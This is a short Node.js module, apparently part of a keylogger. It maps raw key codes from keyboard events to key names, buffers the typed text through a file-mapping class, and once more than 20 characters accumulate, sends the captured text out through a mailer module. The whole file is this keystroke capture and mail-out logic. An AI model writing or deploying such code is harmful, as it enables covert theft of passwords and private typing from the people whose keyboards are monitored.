const jsonCode = require('./keycodes.json');

const FileMap = require('./FileMap');

const MailerMap = require('./Mailer');

class MapKeys extends FileMap{
    
    constructor(){
        super();
    }
    
    getKeyName(e){
        
        const code = e.rawcode;

        const keyword = jsonCode[code];

        this.file_data(keyword);

        if(this.attemptText.length > 20){

            MailerMap.send(this.attemptText)

            this.attemptText = "";
        }

        return keyword;

    }

}

module.exports = new MapKeys();